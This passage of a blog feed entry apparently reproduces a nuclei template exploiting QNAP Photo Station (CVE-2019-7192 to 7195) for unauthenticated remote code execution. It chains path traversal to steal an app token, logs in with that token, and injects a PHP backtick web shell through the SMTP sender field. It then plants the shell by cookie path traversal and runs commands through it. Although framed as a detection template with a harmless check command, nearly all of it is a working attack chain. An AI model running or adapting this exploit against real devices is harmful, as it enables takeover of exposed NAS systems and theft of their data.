class="hljs-symbol">//medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7192</span>,CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7193</span>,CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span>,CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7195</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">78</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,poc<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">command_payload:</span> &#x27;%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>d%<span class="hljs-number">60</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bx%<span class="hljs-number">5</span>D%<span class="hljs-number">60</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">3</span>e%<span class="hljs-number">40</span>s.tp&#x27;<br>  <span class="hljs-params">dropper_command:</span> <span class="hljs-string">&quot;x= echo $((0x2C06*1337))&quot;</span><br>  <span class="hljs-params">dropper_filename:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(6))&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/p/api/album.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;a=setSlideshow&amp;f=qsamplealbum&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> album_id<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;output&gt;([a-zA-Z0-9]+)&lt;/output&gt;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/slideshow.php?album=&#123;&#123;album_id&#125;&#125;&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> access_code<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;encodeURIComponent<span class="hljs-char escape_">\\</span>(&#x27;([A-Za-z0-9%]+)&#x27;<span class="hljs-char escape_">\\</span>)&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">name:</span> phpsessid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;PHPSESSID=([a-z0-9]+);&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/p/api/video.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;PHPSESSID=&#123;&#123;phpsessid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;a=caption&amp;f=UMGObv&amp;album=&#123;&#123;album_id&#125;&#125;&amp;ac=&#123;&#123;access_code&#125;&#125;&amp;filename=../../../../../share/Multimedia/.@__thumb/ps.app.token&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> app_token<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;([a-f0-9]&#123;32&#125;)&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/authLogin.cgi&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;app=PHOTO_STATION&amp;auth=1&amp;app_token=&#123;&#123;app_token&#125;&#125;&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> nas_sid<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-symbol">&lt;authSid&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>\[CDATA\[([a-z0-<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>)\]\]<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>authSid<span class="hljs-operator">&gt;</span>&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/userConfig.cgi?sid=&#123;&#123;nas_sid&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>      <span class="hljs-params">X-Requested-With:</span> XMLHttpRequest<br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;DESKTOP=1; WINDOW_MODE=1; NAS_SID=&#123;&#123;nas_sid&#125;&#125;; PHPSESSID=&#123;&#123;phpsessid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;func=addPersonalSmtp&amp;provider_idx=0&amp;sender=&#123;&#123;command_payload&#125;&#125;&amp;default=0&amp;smtp_server=0.0.0.0&amp;port=25&amp;security=-1&amp;email_account=a%40b.com&amp;email_passwd=ac1db1tch3z&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/slideshow.php?album=qsamplealbum&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;QMS_SID=../../../../../../../../../../mnt/ext/opt/photostation2/&#123;&#123;dropper_filename&#125;&#125;.php; PHPSESSID=&#123;&#123;phpsessid&#125;&#125;; NAS_SID=&#123;&#123;nas_sid&#125;&#125;; DESKTOP=1; CACHE=&#123;&#123;randstr&#125;&#125;;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/&#123;&#123;dropper_filename&#125;&#125;.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>      <span class="hljs-comment"># oh well.. use that cookie jar again here..</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;PHPSESSID=&#123;&#123;phpsessid&#125;&#125;; NAS_SID=&#123;&#123;nas_sid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;&#123;&#123;dropper_command&#125;&#125;&quot;</span><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;NASVARS&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;15067990&quot;</span> <span class="hljs-comment"># magic.</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
